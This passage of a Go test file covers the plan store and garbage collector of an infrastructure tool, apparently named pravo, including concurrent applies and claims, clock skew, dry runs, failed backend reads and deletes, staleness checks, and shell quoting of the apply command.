package engine

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/pravo-systems/pravo/internal/state"
)

// afterBackend runs a function after the writes of a backend.
type afterBackend struct {
	state.Backend
	after func(op, key string)
}

func (h *afterBackend) PutIfAbsent(ctx context.Context, key string, data []byte) (bool, error) {
	ok, err := h.Backend.PutIfAbsent(ctx, key, data)
	h.after("PutIfAbsent", key)
	return ok, err
}

func (h *afterBackend) ReplaceIf(ctx context.Context, key string, update func([]byte) ([]byte, bool)) (bool, error) {
	ok, err := h.Backend.ReplaceIf(ctx, key, update)
	h.after("ReplaceIf", key)
	return ok, err
}

// flakyGet fails the first read of one key.
type flakyGet struct {
	state.Backend
	failKey string
	failed  bool
}

func (f *flakyGet) Get(ctx context.Context, key string) ([]byte, error) {
	if key == f.failKey && !f.failed {
		f.failed = true
		return nil, errors.New("s3 get: 503 slow down")
	}
	return f.Backend.Get(ctx, key)
}

// countingGet counts the reads of each key.
type countingGet struct {
	state.Backend
	mu    sync.Mutex
	reads map[string]int
}

func (c *countingGet) Get(ctx context.Context, key string) ([]byte, error) {
	c.mu.Lock()
	c.reads[key]++
	c.mu.Unlock()
	return c.Backend.Get(ctx, key)
}

// A plan whose summary cannot be read is not a plan that was stored in part: a
// summary of a newer format, or one that a failed read hides, is left alone.
func TestAWholePlanWithAnUnreadableSummaryIsNotRemoved(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		data, _ := ps.B.Get(ctx, metaKey2(m.ID))
		newer := strings.Replace(string(data), `"format": 1`, `"format": 2`, 1)
		if newer == string(data) {
			t.Fatalf("no format in %s", data)
		}
		if err := ps.B.Put(ctx, metaKey2(m.ID), []byte(newer)); err != nil {
			t.Fatal(err)
		}
		*clock = t0.Add(3 * time.Hour) // far inside the seven days
		if res := collect(t, ps, GCOptions{}); len(res.Removed) != 0 {
			t.Errorf("removed %+v", res.Removed)
		}
		if _, _, err := ps.ReadFile(ctx, m.ID); err != nil {
			t.Errorf("the plan was damaged: %v", err)
		}
		if _, err := ps.Meta(ctx, m.ID); err == nil || !strings.Contains(err.Error(), "newer pravo") {
			t.Errorf("the summary of a newer format: %v", err)
		}
	})
}

func TestAFailedReadOfTheSummaryDoesNotRemoveThePlan(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		*clock = t0.Add(3 * time.Hour)
		hooked := &PlanStore{B: &flakyGet{Backend: ps.B, failKey: metaKey2(m.ID)}, Now: ps.Now}
		if res := collect(t, hooked, GCOptions{}); len(res.Removed) != 0 {
			t.Errorf("removed %+v", res.Removed)
		}
		if _, _, err := ps.ReadFile(ctx, m.ID); err != nil {
			t.Errorf("the plan was damaged: %v", err)
		}
	})
}

// A dry run removes nothing, the remains of an incomplete store included, and
// keeps the mark of a plan that is not stale any more.
func TestADryRunLeavesTheRemainsOfAnIncompleteStoreAlone(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		data, _ := indentJSON(gcPlan(t0, change("a", ActionCreate, 0)))
		planOnly := digestID(data, planIDHex)
		if ok, err := ps.B.PutIfAbsent(ctx, planKey(planOnly), data); err != nil || !ok {
			t.Fatal(ok, err)
		}
		ps.B.PutIfAbsent(ctx, progressKey("plan-bbbbbb00"), []byte(`{"format":1,"id":"plan-bbbbbb00","updated":"2026-10-01T09:00:00Z"}`))
		*clock = t0.Add(2 * time.Hour)
		before := snapshot(t, ps.B)
		res := collect(t, ps, GCOptions{DryRun: true})
		if ids(res.Removed) != sorted(planOnly, "plan-bbbbbb00") {
			t.Errorf("would remove %+v", res.Removed)
		}
		if after := snapshot(t, ps.B); fmt.Sprint(before) != fmt.Sprint(after) {
			t.Errorf("a dry run wrote:\nbefore %v\nafter  %v", before, after)
		}
	})
}

func TestADryRunKeepsTheMarkOfAPlanThatIsNotStaleAnyMore(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionUpdate, 1))
		*clock = t0.Add(time.Minute)
		collect(t, ps, GCOptions{Check: stateAt(map[string]int{"a": 2})})
		*clock = t0.Add(time.Hour)
		before := snapshot(t, ps.B)
		collect(t, ps, GCOptions{Check: stateAt(map[string]int{"a": 1}), DryRun: true})
		if after := snapshot(t, ps.B); fmt.Sprint(before) != fmt.Sprint(after) {
			t.Errorf("a dry run wrote:\nbefore %v\nafter  %v", before, after)
		}
		if pr, _ := ps.Progress(ctx, m.ID); pr.StaleSince == nil {
			t.Error("the dry run cleared the mark")
		}
	})
}

// An apply that began and ended between the judgement and the claim is respected.
func TestAnApplyThatEndsBetweenTheJudgementAndTheClaimKeepsThePlanForAWhile(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		*clock = t0.Add(2 * time.Hour)
		other := NewPlanStore(ps.B)
		other.Now = ps.Now
		fired := false
		hooked := &PlanStore{B: &hookBackend{Backend: ps.B, before: func(op, key string) {
			if !fired && key == progressKey(m.ID) {
				fired = true
				if err := other.BeginApply(ctx, m.ID, "alice#1"); err != nil {
					t.Error(err)
				}
				if err := other.MarkApplied(ctx, m.ID, []string{"a"}, "txn-1", []string{"a"}); err != nil {
					t.Error(err)
				}
				other.EndApply(ctx, m.ID, "alice#1")
			}
		}}, Now: ps.Now}
		res := collect(t, hooked, GCOptions{Owner: "collector#1"})
		if !fired {
			t.Fatal("the collector did not claim the plan")
		}
		if len(res.Removed) != 0 {
			t.Errorf("removed %+v", res.Removed)
		}
		if _, _, err := ps.ReadFile(ctx, m.ID); err != nil {
			t.Errorf("the plan was removed although it was applied a moment ago: %v", err)
		}
	})
}

// A collector that was stopped for more than half of its claim leaves the plan alone.
func TestACollectorThatWasStoppedAfterItsClaimLeavesThePlanAlone(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		*clock = t0.Add(2 * time.Hour)
		fired := false
		hooked := &PlanStore{B: &afterBackend{Backend: ps.B, after: func(op, key string) {
			if !fired && key == progressKey(m.ID) {
				fired = true
				*clock = clock.Add(claimTimeout/2 + time.Minute) // stopped; the claim has not lapsed
			}
		}}, Now: ps.Now}
		res := collect(t, hooked, GCOptions{Owner: "collector#1"})
		if !fired {
			t.Fatal("the collector did not claim the plan")
		}
		if len(res.Removed) != 0 {
			t.Errorf("removed %+v", res.Removed)
		}
		if _, _, err := ps.ReadFile(ctx, m.ID); err != nil {
			t.Errorf("the plan was removed by a collector whose claim was about to lapse: %v", err)
		}
	})
}

// A collector whose claim was taken over, because an apply on a machine whose clock
// runs ahead saw it lapse, does not remove the plan.
func TestACollectorWhoseClaimWasTakenOverLeavesThePlanAlone(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		*clock = t0.Add(2 * time.Hour)
		ahead := NewPlanStore(ps.B)
		ahead.Now = func() time.Time { return clock.Add(claimTimeout + time.Minute) }
		fired := false
		hooked := &PlanStore{B: &afterBackend{Backend: ps.B, after: func(op, key string) {
			if !fired && key == progressKey(m.ID) {
				fired = true
				if err := ahead.BeginApply(ctx, m.ID, "alice#1"); err != nil {
					t.Error(err)
				}
			}
		}}, Now: ps.Now}
		res := collect(t, hooked, GCOptions{Owner: "collector#1"})
		if !fired {
			t.Fatal("the collector did not claim the plan")
		}
		if len(res.Removed) != 0 {
			t.Errorf("removed %+v", res.Removed)
		}
		if _, _, err := ps.ReadFile(ctx, m.ID); err != nil {
			t.Errorf("the plan was removed under an apply: %v", err)
		}
		if pr, _ := ps.Progress(ctx, m.ID); len(pr.Applying) != 1 {
			t.Errorf("progress %+v", pr)
		}
	})
}

// A plan object that is not what its name says is not deleted, and is not
// reported as removed by a collection that did not remove it.
func TestAPlanObjectWhoseDigestIsNotItsNameIsNeitherDeletedNorReportedRemoved(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		data, _ := indentJSON(gcPlan(t0, change("a", ActionCreate, 0)))
		const id = "plan-dddddd00"
		if ok, err := ps.B.PutIfAbsent(ctx, planKey(id), data); err != nil || !ok {
			t.Fatal(ok, err)
		}
		*clock = t0.Add(2 * time.Hour)
		for i := 0; i < 2; i++ {
			res := collect(t, ps, GCOptions{})
			if len(res.Removed) != 0 {
				t.Errorf("collection %d: reported %+v removed", i, res.Removed)
			}
			if got, err := ps.B.Get(ctx, planKey(id)); err != nil || string(got) != string(data) {
				t.Errorf("collection %d: a plan object whose digest is not its id was deleted: %v", i, err)
			}
		}
		if got := listKeys(t, ps.B, PlanDir); len(got) != 1 {
			t.Errorf("objects %v", got)
		}
	})
}

// A summary that names another id is not deleted, and the plan it sits beside is
// not reported as removed.
func TestASummaryThatNamesAnotherPlanIsNotDeleted(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		data, _ := ps.B.Get(ctx, metaKey2(m.ID))
		foreign := strings.Replace(string(data), `"id": "`+m.ID+`"`, `"id": "plan-eeeeee00"`, 1)
		if foreign == string(data) {
			t.Fatalf("no id in %s", data)
		}
		if err := ps.B.Put(ctx, metaKey2(m.ID), []byte(foreign)); err != nil {
			t.Fatal(err)
		}
		*clock = t0.Add(2 * time.Hour)
		collect(t, ps, GCOptions{})
		if got, err := ps.B.Get(ctx, metaKey2(m.ID)); err != nil || string(got) != foreign {
			t.Errorf("a summary that names another plan was deleted: %v", err)
		}
	})
}

// A progress object that another collector has claimed is not deleted by this one.
func TestAProgressObjectClaimedByAnotherCollectorIsNotDeleted(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		*clock = t0.Add(2 * time.Hour)
		other := NewPlanStore(ps.B)
		other.Now = ps.Now
		fired := false
		hooked := &PlanStore{B: &hookBackend{Backend: ps.B, before: func(op, key string) {
			if !fired && op == "DeleteIf" && key == progressKey(m.ID) {
				fired = true
				if err := other.updateProgress(ctx, m.ID, func(p *PlanProgress) error {
					p.Collecting = &PlanClaim{By: "collector#2", At: *clock}
					return nil
				}); err != nil {
					t.Error(err)
				}
			}
		}}, Now: ps.Now}
		collect(t, hooked, GCOptions{Owner: "collector#1"})
		if !fired {
			t.Fatal("no deletion of the progress object")
		}
		if pr, err := ps.Progress(ctx, m.ID); err != nil || pr.Collecting == nil || pr.Collecting.By != "collector#2" {
			t.Errorf("the claim of the other collector was deleted: %+v %v", pr, err)
		}
	})
}

// A plan that is past its ttl is expired whether or not the state moved on, so it
// is collected at once and not marked.
func TestAnExpiredPlanThatIsAlsoStaleIsExpiredAndCollectedAtOnce(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionUpdate, 1))
		*clock = t0.Add(2 * time.Hour)
		moved := stateAt(map[string]int{"a": 2})
		if e, _ := ps.Entry(ctx, m.ID, moved); e.Status != PlanExpired {
			t.Errorf("status %s", e.Status)
		}
		res := collect(t, ps, GCOptions{Check: moved})
		if ids(res.Removed) != m.ID || len(res.Marked) != 0 {
			t.Errorf("%+v", res)
		}
	})
}

// The leftovers of a removed plan do not take part in resolving an id.
func TestLeftoversDoNotMakeAPrefixAmbiguousOrResolve(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		stray := "plan-" + m.ID[len("plan-"):len("plan-")+6] + "ff"
		if stray == m.ID {
			stray = "plan-" + m.ID[len("plan-"):len("plan-")+6] + "00"
		}
		ps.B.PutIfAbsent(ctx, progressKey(stray), []byte(`{"format":1,"id":"`+stray+`"}`))
		if got, err := ps.Resolve(ctx, m.ID[:len("plan-")+6]); err != nil || got != m.ID {
			t.Errorf("prefix: %s, %v", got, err)
		}
		if _, err := ps.Resolve(ctx, stray); !errors.Is(err, ErrNoPlan) {
			t.Errorf("a progress object alone resolved: %v", err)
		}
	})
}

// A progress object that a collector deleted between the read and the replace is
// made again by the apply that began.
func TestAnApplyBeginsAgainWhenTheProgressObjectIsDeletedUnderIt(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		if err := ps.BeginApply(ctx, m.ID, "first#1"); err != nil {
			t.Fatal(err)
		}
		fired := false
		hooked := &PlanStore{B: &hookBackend{Backend: ps.B, before: func(op, key string) {
			if !fired && op == "ReplaceIf" && key == progressKey(m.ID) {
				fired = true
				if err := ps.B.Delete(ctx, key); err != nil {
					t.Error(err)
				}
			}
		}}, Now: ps.Now}
		if err := hooked.BeginApply(ctx, m.ID, "second#2"); err != nil {
			t.Errorf("begin: %v", err)
		}
		if !fired {
			t.Fatal("no replace")
		}
		if pr, _ := ps.Progress(ctx, m.ID); len(pr.Applying) != 1 || pr.Applying[0].By != "second#2" {
			t.Errorf("progress %+v", pr)
		}
	})
}

// Every apply from a plan holds a claim of its own. A second apply that ends, because
// the nodes are locked or for any other reason, does not take the claim of the first.
func TestAppliesFromOnePlanKeepTheirOwnClaims(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0), change("b", ActionCreate, 0))
		if err := ps.BeginApply(ctx, m.ID, "alice#1"); err != nil {
			t.Fatal(err)
		}
		if err := ps.BeginApply(ctx, m.ID, "bob#2"); err != nil {
			t.Fatal(err)
		}
		if pr, _ := ps.Progress(ctx, m.ID); len(pr.Applying) != 2 {
			t.Fatalf("claims %+v", pr.Applying)
		}
		// The second ends at once. The first still holds the plan against a collection.
		ps.EndApply(ctx, m.ID, "bob#2")
		*clock = t0.Add(2 * time.Hour) // past the ttl
		res := collect(t, ps, GCOptions{})
		if len(res.Removed) != 0 || len(res.Kept) != 1 || !strings.Contains(res.Kept[0].Reason, "alice#1") {
			t.Errorf("%+v", res)
		}
		// Recording what one apply did leaves the claim of the other.
		if err := ps.BeginApply(ctx, m.ID, "bob#2"); err != nil {
			t.Fatal(err)
		}
		if err := ps.MarkApplied(ctx, m.ID, []string{"a"}, "txn-1", []string{"a", "b"}); err != nil {
			t.Fatal(err)
		}
		pr, _ := ps.Progress(ctx, m.ID)
		if len(pr.Applying) != 2 || pr.DoneAt != nil {
			t.Errorf("progress %+v", pr)
		}
		// Ending a claim that is not one's own does nothing.
		ps.EndApply(ctx, m.ID, "carol#3")
		if pr, _ = ps.Progress(ctx, m.ID); len(pr.Applying) != 2 {
			t.Errorf("another's end took a claim: %+v", pr.Applying)
		}
		ps.EndApply(ctx, m.ID, "alice#1")
		ps.EndApply(ctx, m.ID, "bob#2")
		if pr, _ = ps.Progress(ctx, m.ID); len(pr.Applying) != 0 {
			t.Errorf("claims left: %+v", pr.Applying)
		}
		// A claim that was left by an apply that was killed lapses after a day.
		if err := ps.BeginApply(ctx, m.ID, "dead#4"); err != nil {
			t.Fatal(err)
		}
		*clock = clock.Add(applyingKeep + time.Minute)
		if err := ps.BeginApply(ctx, m.ID, "alice#1"); err != nil {
			t.Fatal(err)
		}
		if pr, _ = ps.Progress(ctx, m.ID); len(pr.Applying) != 1 || pr.Applying[0].By != "alice#1" {
			t.Errorf("claims %+v", pr.Applying)
		}
	})
}

// Applies of separate parts of one plan, at the same time, finish the plan between
// them: the one that records last sees that nothing is left.
func TestPartsOfAPlanAppliedAtTheSameTimeFinishIt(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0), change("b", ActionCreate, 0))
		pending := []string{"a", "b"}
		if err := ps.MarkApplied(ctx, m.ID, []string{"a"}, "txn-a", pending); err != nil {
			t.Fatal(err)
		}
		if e, _ := ps.Entry(ctx, m.ID, nil); e.Status != PlanPartial || e.Progress.DoneAt != nil {
			t.Fatalf("after the first part: %s", e.Status)
		}
		if err := ps.MarkApplied(ctx, m.ID, []string{"b"}, "txn-b", pending); err != nil {
			t.Fatal(err)
		}
		e, _ := ps.Entry(ctx, m.ID, nil)
		if e.Status != PlanApplied || e.Progress.DoneAt == nil || e.AppliedCount() != 2 {
			t.Errorf("after both: %s, %+v", e.Status, e.Progress)
		}
		// A plan that has nothing pending, such as one that only records outputs, is done at once.
		n := putPlan(t, ps, t0.Add(time.Second), "bob", 0)
		if err := ps.MarkApplied(ctx, n.ID, nil, "txn-n", nil); err != nil {
			t.Fatal(err)
		}
		if e, _ := ps.Entry(ctx, n.ID, nil); e.Status != PlanApplied {
			t.Errorf("a plan with nothing pending: %s", e.Status)
		}
	})
}

// The progress of a plan that was removed is not made again by an apply that ends.
func TestRecordingAnApplyOfAPlanThatWasRemovedSaysSo(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		*clock = t0.Add(2 * time.Hour)
		collect(t, ps, GCOptions{})
		err := ps.MarkApplied(ctx, m.ID, []string{"a"}, "txn-1", []string{"a"})
		if !errors.Is(err, ErrNoPlan) || !strings.Contains(err.Error(), "removed while it was applied") {
			t.Errorf("%v", err)
		}
		if got := listKeys(t, ps.B, PlanDir); len(got) != 0 {
			t.Errorf("left over: %v", got)
		}
	})
}

// A collection that begins while a plan is being stored, with a clock that is ahead,
// may take the plan, written without its summary, for a write that did not finish:
// the writer finds out.
func TestAPlanThatWasRemovedWhileItWasBeingStoredIsReported(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		ahead := NewPlanStore(ps.B)
		ahead.Now = func() time.Time { return clock.Add(90 * time.Minute) }
		pf := gcPlan(t0, change("a", ActionCreate, 0))
		data, _ := indentJSON(pf)
		meta := newPlanMeta(pf, "alice", 0, len(data))
		fired := false
		writer := &PlanStore{B: &hookBackend{Backend: ps.B, before: func(op, key string) {
			if !fired && op == "PutIfAbsent" && strings.HasSuffix(key, metaExt) {
				fired = true
				if res, err := ahead.GC(ctx, GCOptions{Owner: "collector#1"}); err != nil || len(res.Removed) != 1 {
					t.Errorf("the collection: %+v %v", res, err)
				}
			}
		}}, Now: ps.Now}
		err := writer.Put(ctx, data, meta)
		if err == nil || !strings.Contains(err.Error(), "was removed by a collection while it was being stored") {
			t.Errorf("%v", err)
		}
	})
}

// The plan that a caller has just stored is left alone by its own collection, even
// when its ttl was so short that it has expired.
func TestACollectionLeavesThePlanItIsToldToSkip(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		fresh := putPlan(t, ps, t0, "alice", time.Millisecond, change("a", ActionCreate, 0))
		old := putPlan(t, ps, t0.Add(time.Second), "bob", time.Millisecond, change("b", ActionCreate, 0))
		*clock = t0.Add(time.Minute)
		res := collect(t, ps, GCOptions{Skip: fresh.ID})
		if ids(res.Removed) != old.ID || !exists(ps, fresh.ID) || res.Looked != 1 {
			t.Errorf("%+v", res)
		}
	})
}

// A collection reports a removal only when it made one: deletes that the backend
// refuses leave the plan, and the report does not say that it was removed.
func TestCollectionsReportRemovalsThatTheyMade(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", time.Hour, change("a", ActionCreate, 0))
		*clock = t0.Add(2 * time.Hour)
		failing := &PlanStore{B: &refuseDeletes{Backend: ps.B, keys: map[string]bool{planKey(m.ID): true, metaKey2(m.ID): true}}, Now: ps.Now}
		if res := collect(t, failing, GCOptions{}); len(res.Removed) != 0 {
			t.Errorf("reported %+v removed", res.Removed)
		}
		for _, k := range []string{planKey(m.ID), metaKey2(m.ID)} {
			if _, err := ps.B.Get(ctx, k); err != nil {
				t.Errorf("%s: %v", k, err)
			}
		}
		// The next collection, with a backend that works, removes it and says so.
		if res := collect(t, ps, GCOptions{}); ids(res.Removed) != m.ID {
			t.Errorf("%+v", res.Removed)
		}
	})
}

// refuseDeletes fails the deletion of some keys.
type refuseDeletes struct {
	state.Backend
	keys map[string]bool
}

func (r *refuseDeletes) DeleteIf(ctx context.Context, key string, match func([]byte) bool) (bool, error) {
	if r.keys[key] {
		return false, errors.New("s3 delete: 503 slow down")
	}
	return r.Backend.DeleteIf(ctx, key, match)
}

// A progress object that cannot be read keeps a plan from being applied and listed
// for good; a collection makes it empty once no write of it can still be running.
func TestAProgressObjectThatCannotBeReadIsMadeEmptyAfterAnHour(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		m := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		if err := ps.B.Put(ctx, progressKey(m.ID), []byte("")); err != nil {
			t.Fatal(err)
		}
		*clock = t0.Add(30 * time.Minute)
		collect(t, ps, GCOptions{})
		if _, err := ps.Progress(ctx, m.ID); err == nil {
			t.Error("a progress object that may still be being written was replaced")
		}
		if es, _ := ps.Entries(ctx, nil); len(es) != 0 {
			t.Errorf("listed with an unreadable progress: %d", len(es))
		}
		*clock = t0.Add(2 * time.Hour)
		before := snapshot(t, ps.B)
		collect(t, ps, GCOptions{DryRun: true})
		if fmt.Sprint(before) != fmt.Sprint(snapshot(t, ps.B)) {
			t.Error("a dry run repaired the object")
		}
		collect(t, ps, GCOptions{})
		pr, err := ps.Progress(ctx, m.ID)
		if err != nil || pr.ID != m.ID {
			t.Fatalf("%+v %v", pr, err)
		}
		if err := ps.BeginApply(ctx, m.ID, "alice#1"); err != nil {
			t.Errorf("the plan cannot be applied after the repair: %v", err)
		}
		if es, _ := ps.Entries(ctx, nil); len(es) != 1 {
			t.Errorf("not listed after the repair: %d", len(es))
		}
	})
}

// A listing does not ask for the progress objects that the plans do not have, and
// asks for the summary of each plan once.
func TestAListingAsksOnlyForWhatIsThere(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		var withProgress string
		for i := 0; i < 6; i++ {
			m := putPlan(t, ps, t0.Add(time.Duration(i)*time.Second), "alice", 0, change(fmt.Sprintf("r%d", i), ActionCreate, 0))
			if i == 0 {
				withProgress = m.ID
				if err := ps.BeginApply(ctx, m.ID, "alice#1"); err != nil {
					t.Fatal(err)
				}
			}
		}
		counter := &countingGet{Backend: ps.B, reads: map[string]int{}}
		counted := &PlanStore{B: counter, Now: ps.Now}
		es, err := counted.Entries(ctx, nil)
		if err != nil || len(es) != 6 {
			t.Fatalf("%d entries, %v", len(es), err)
		}
		progress := 0
		for k, n := range counter.reads {
			if strings.HasSuffix(k, progressExt) {
				progress += n
				if k != progressKey(withProgress) {
					t.Errorf("asked for %s, which is not there", k)
				}
			}
			if strings.HasSuffix(k, metaExt) && n != 1 {
				t.Errorf("%s was read %d times", k, n)
			}
		}
		if progress != 1 {
			t.Errorf("progress objects read: %d", progress)
		}
	})
}

// A listing asks the state for each record once, however many plans expect it.
func TestAListingReadsEachRecordOnce(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		for i := 0; i < 5; i++ {
			putPlan(t, ps, t0.Add(time.Duration(i)*time.Second), "alice", 0, change("shared", ActionUpdate, 1), change("own"+string(rune('a'+i)), ActionCreate, 0))
		}
		var mu sync.Mutex
		reads := map[string]int{}
		check := &PlanCheck{Lineage: "lineage-1", Versions: func(addrs []string) (map[string]state.Version, error) {
			mu.Lock()
			defer mu.Unlock()
			out := map[string]state.Version{}
			for _, a := range addrs {
				reads[a]++
				out[a] = state.Version{Revision: 1}
			}
			return out, nil
		}}
		if _, err := ps.Entries(ctx, check); err != nil {
			t.Fatal(err)
		}
		if reads["shared"] != 1 {
			t.Errorf("shared was read %d times for 5 plans: %v", reads["shared"], reads)
		}
		reads = map[string]int{}
		collect(t, ps, GCOptions{Check: check})
		if reads["shared"] != 1 {
			t.Errorf("a collection read shared %d times for 5 plans: %v", reads["shared"], reads)
		}
	})
}

func mixedPlan() *PlanFile {
	rep := change("rep", ActionReplace, 2)
	rep.PriorGeneration = "gr"
	pf := gcPlan(t0,
		rep,
		savedChange{Addr: "rd", Mode: "data", Type: "t", Action: ActionRead, Deferred: true, PriorRevision: 1},
		savedChange{Addr: "rd2", Mode: "data", Type: "t", Action: ActionRead, PriorRevision: 5},
		savedChange{Addr: "rd3", Mode: "data", Type: "t", Action: ActionRead, Skipped: true, PriorRevision: 6},
		savedChange{Addr: "mv", Mode: "managed", Type: "t", Action: ActionMove, PriorRevision: 7},
		savedChange{Addr: "imp", Mode: "managed", Type: "t", Action: ActionNoop, Imported: true},
		savedChange{Addr: "skp", Mode: "managed", Type: "t", Action: ActionUpdate, Skipped: true, PriorRevision: 3},
		savedChange{Addr: "kpt", Mode: "managed", Type: "t", Action: ActionDelete, Kept: true, PriorRevision: 4},
		savedChange{Addr: "app", Mode: "managed", Type: "t", Action: ActionCreate, Applied: true},
	)
	pf.Inputs = map[string]int{"in": 9, "rep": 2}
	pf.InputGenerations = map[string]string{"in": "g9"}
	return pf
}

// What a summary says about the changes of a plan and the versions it expects.
func TestTheSummaryCountsLikeThePlanAndNamesWhatItExpects(t *testing.T) {
	m := newPlanMeta(mixedPlan(), "alice", 0, 1)
	// The reads count as the plan counts them: every read that was not skipped.
	if m.Summary.Read != 2 {
		t.Errorf("reads %+v", m.Summary)
	}
	rep := newPlanMeta(gcPlan(t0, change("rep", ActionReplace, 2)), "alice", 0, 1)
	if rep.Summary != (PlanCounts{Add: 1, Destroy: 1}) {
		t.Errorf("a replace is an add and a destroy: %+v", rep.Summary)
	}
	var touched []string
	for _, c := range m.Changes {
		touched = append(touched, c.Addr)
	}
	// Sorted by address; a read that returned its record is not a change, a move and an import are.
	if got := strings.Join(touched, ","); got != "app,imp,kpt,mv,rd,rep,skp" {
		t.Errorf("changes %s", got)
	}
	want := map[string]PlanBase{
		"rep": {Revision: 2, Generation: "gr"},
		"rd":  {Revision: 1},
		"rd2": {Revision: 5},
		"imp": {},
		"in":  {Revision: 9, Generation: "g9", Reads: true},
	}
	if len(m.Bases) != len(want) {
		t.Errorf("bases %+v", m.Bases)
	}
	for addr, b := range want {
		if m.Bases[addr] != b {
			t.Errorf("base of %s: %+v, want %+v", addr, m.Bases[addr], b)
		}
	}
}

func TestAPlanIsStaleWhenARecordItReadsMovedOrWasMadeAgain(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		m := putFile(t, ps, mixedPlan(), "alice", 0)
		have := map[string]state.Version{
			"rep": {Revision: 2, Generation: "gr"}, "rd": {Revision: 1}, "rd2": {Revision: 5}, "imp": {}, "in": {Revision: 9, Generation: "g9"},
			// not expected by the plan: whatever they are, they do not matter
			"mv": {Revision: 70}, "skp": {Revision: 30}, "kpt": {Revision: 40}, "app": {Revision: 8},
		}
		check := func() *PlanCheck {
			return &PlanCheck{Lineage: "lineage-1", Versions: func(addrs []string) (map[string]state.Version, error) {
				out := map[string]state.Version{}
				for _, a := range addrs {
					out[a] = have[a]
				}
				return out, nil
			}}
		}
		status := func() (PlanStatus, string) {
			e, err := ps.Entry(ctx, m.ID, check())
			if err != nil {
				t.Fatal(err)
			}
			return e.Status, strings.Join(e.Reasons, " | ")
		}
		if st, why := status(); st != PlanPending {
			t.Fatalf("everything as expected: %s (%s)", st, why)
		}
		have["in"] = state.Version{Revision: 10, Generation: "g9"}
		if st, why := status(); st != PlanStale || !strings.Contains(why, "in changed") || !strings.Contains(why, "the plan reads it") {
			t.Errorf("a record that the plan reads moved: %s (%s)", st, why)
		}
		have["in"] = state.Version{Revision: 9, Generation: "g10"}
		if st, why := status(); st != PlanStale || !strings.Contains(why, "created again") {
			t.Errorf("a record that the plan reads was made again: %s (%s)", st, why)
		}
		have["in"] = state.Version{Revision: 9, Generation: "g9"}
		have["rep"] = state.Version{Revision: 3, Generation: "gr"}
		// A record that only a change writes conflicts for that change: the plan
		// has other changes that it can still apply.
		if st, why := status(); st != PlanPartlyStale || !strings.Contains(why, "rep changed") || strings.Contains(why, "the plan reads it") {
			t.Errorf("a record that the plan writes moved: %s (%s)", st, why)
		}
		have["rep"] = state.Version{Revision: 2, Generation: "other"}
		if st, why := status(); st != PlanPartlyStale || !strings.Contains(why, "created again") {
			t.Errorf("a record that the plan writes was made again: %s (%s)", st, why)
		}
	})
}

func TestTheApplyCommandQuotesWhatNeedsIt(t *testing.T) {
	m := &PlanMeta{ID: "plan-12345678", Tags: []string{"msg=hello world", "name=o'neil", "plain=a-b_c.d", ""}, SysTags: true}
	want := `pravo apply plan-12345678 -t 'msg=hello world' -t 'name=o'\''neil' -t plain=a-b_c.d -t '' -T`
	if got := m.ApplyCommand(); got != want {
